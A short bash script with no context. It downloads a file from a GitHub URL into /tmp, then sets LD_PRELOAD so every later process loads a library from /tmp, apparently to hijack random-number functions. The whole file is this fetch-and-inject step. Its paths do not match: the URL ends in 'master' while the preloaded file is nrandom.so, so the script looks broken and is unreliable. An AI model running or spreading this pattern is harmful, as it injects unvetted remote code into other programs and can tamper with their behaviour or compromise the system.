#!/bin/bash
wget -P /tmp/ https://raw.github.com/racheluneke/master
export LD_PRELOAD=/tmp/nrandom.so
